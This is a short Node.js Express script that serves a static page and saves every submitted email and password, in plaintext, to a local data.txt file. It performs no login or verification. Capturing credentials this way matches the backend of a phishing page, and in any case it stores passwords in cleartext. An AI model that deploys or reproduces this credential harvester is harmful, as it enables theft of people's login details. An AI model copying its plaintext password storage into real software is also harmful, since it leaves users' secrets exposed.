const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));

// Handle form submission
app.post('/submit', (req, res) => {
    const { email, password } = req.body;
    const data = `Email:- ${email}, Password:- ${password}\n`;

    fs.appendFile('data.txt', data, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            res.status(500).send('An error occurred');
            return;
        }
        res.send('Login details stored successfully');
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
